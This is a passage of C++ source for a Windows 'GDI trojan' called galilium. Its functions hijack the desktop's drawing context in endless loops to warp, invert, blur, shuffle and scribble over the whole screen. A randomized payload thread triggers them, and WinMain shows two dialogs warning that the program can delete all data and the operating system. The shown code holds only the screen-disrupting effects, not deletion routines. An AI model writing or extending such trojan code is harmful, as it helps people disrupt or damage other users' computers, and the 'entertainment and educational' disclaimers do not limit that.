		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI sines(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HWND wnd = GetDesktopWindow();
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	double angle = 0;
	while (true) {
		hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (float z = 0; z < w + h; z += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(mdc, 0, z, w, 1, mdc, a, z, SRCCOPY);
			angle += M_PI / 40;
			DeleteObject(&z); DeleteObject(&a);
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(wnd, mdc); DeleteObject(hbit); DeleteObject(mdc); DeleteObject(hdc);
	}
}

DWORD WINAPI merge(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HGDIOBJ obj = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, obj);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, MERGECOPY);
		DeleteObject(obj);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
}

DWORD WINAPI asterisk(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		DrawIcon(hdc, rand() % w, rand() % h, LoadIconA(NULL, (LPCSTR)IDI_ASTERISK));
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI sines1(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HWND wnd = GetDesktopWindow();
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	double angle = 0;
	while (true) {
		hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (float z = 0; z < w + h; z += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(mdc, 0, z, w, 1, mdc, a, z, SRCINVERT);
			angle += M_PI / 40;
			DeleteObject(&z); DeleteObject(&a);
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(wnd, mdc); DeleteObject(hbit); DeleteObject(mdc); DeleteObject(hdc);
	}
}

DWORD WINAPI lines(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		POINT pt[4] = { rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h };
		HPEN pen = CreatePen(PS_SOLID, 5, RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, pen);
		Polyline(hdc, pt, 4);
		DeleteObject(pen);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI omg(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	while (true) {
		hdc = GetDC(NULL);
		BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCAND);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI shuffle(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int a = rand() % w, b = rand() % h;
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, a, b, 1000, 1000, hdc, a + rand() % 21 - 10, b + rand() % 21 - 10, 0x1900AC010E);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI payload(LPVOID lpParam) {
	tagRECT tag;
	__time64_t bruh = time((__time64_t*)0x0);
	srand((int)bruh);
	while (true) {
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &tag);
		int count = rand() % 15 + 1;
		if (count == 15) {
			HANDLE thread1 = CreateThread(0, 0, plgblt, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, textout, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			TerminateThread(thread1dot1, 0);
			CloseHandle(thread1dot1);
		}
		if (count == 14) {
			HANDLE thread2 = CreateThread(0, 0, profect, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
		}
		if (count == 13) {
			HANDLE thread3 = CreateThread(0, 0, train, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, darkpixel, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread3dot1);
		}
		if (count == 12) {
			HANDLE thread4 = CreateThread(0, 0, train1, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, invcc, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			TerminateThread(thread4dot1, 0);
			CloseHandle(thread4dot1);
		}
		if (count == 11) {
			HANDLE thread5 = CreateThread(0, 0, shader1, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
		}
		if (count == 10) {
			HANDLE thread6 = CreateThread(0, 0, up, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
		}
		if (count == 9) {
			HANDLE thread7 = CreateThread(0, 0, blur, 0, 0, 0);
			HANDLE thread7dot1 = CreateThread(0, 0, ballz, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			TerminateThread(thread7dot1, 0);
			CloseHandle(thread7dot1);
		}
		if (count == 8) {
			HANDLE thread8 = CreateThread(0, 0, rotate, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
		}
		if (count == 7) {
			HANDLE thread9 = CreateThread(0, 0, plgblt1, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
		}
		if (count == 6) {
			HANDLE thread10 = CreateThread(0, 0, shader2, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
		}
		if (count == 5) {
			HANDLE thread11 = CreateThread(0, 0, up1, 0, 0, 0);
			HANDLE thread11dot1 = CreateThread(0, 0, cur1, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			TerminateThread(thread11dot1, 0);
			CloseHandle(thread11dot1);
		}
		if (count == 4) {
			HANDLE thread12 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread12dot1 = CreateThread(0, 0, sines, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			TerminateThread(thread12dot1, 0);
			CloseHandle(thread12dot1);
		}
		if (count == 3) {
			HANDLE thread13 = CreateThread(0, 0, merge, 0, 0, 0);
			HANDLE thread13dot1 = CreateThread(0, 0, asterisk, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			TerminateThread(thread13dot1, 0);
			CloseHandle(thread13dot1);
		}
		if (count == 2) {
			HANDLE thread14 = CreateThread(0, 0, sines1, 0, 0, 0);
			HANDLE thread14dot1 = CreateThread(0, 0, lines, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			TerminateThread(thread14dot1, 0);
			CloseHandle(thread14dot1);
		}
		if (count == 1) {
			HANDLE thread15 = CreateThread(0, 0, omg, 0, 0, 0);
			HANDLE thread15dot1 = CreateThread(0, 0, shuffle, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			TerminateThread(thread15dot1, 0);
			CloseHandle(thread15dot1);
		}
		Sleep(100);
		InvalidateRect(0, 0, 0);
		InvalidateRect(0, 0, 0);
		Sleep(100);
		InvalidateRect(0, 0, 0);
		InvalidateRect(0, 0, 0);
		Sleep(100);
		InvalidateRect(0, 0, 0);
		InvalidateRect(0, 0, 0);
	}
}

int CALLBACK WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	if (MessageBoxW(NULL, L"Warning! You have ran a randomized trojan known as galilium that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"galilium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"Final warning! This randomized trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"galilium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			Sleep(3000);
			CreateThread(0, 0, msg, 0, 0, 0);
			Sleep(1000);
			HANDLE thread0 = CreateThread(0, 0, logo, 0, 0, 0);
			Sleep(1000);
			CreateThread(0, 0, textz, 0, 0, 0);
			CreateThread(0, 0, cur, 0, 0, 0);
			HANDLE audios = CreateThread(0, 0, sound, 0, 0, 0);
			HANDLE effects = CreateThread(0, 0, payload, 0, 0, 0);
			Sleep(301000);
			TerminateThread(effects, 0);
			CloseHandle(effects);
		}
	}
}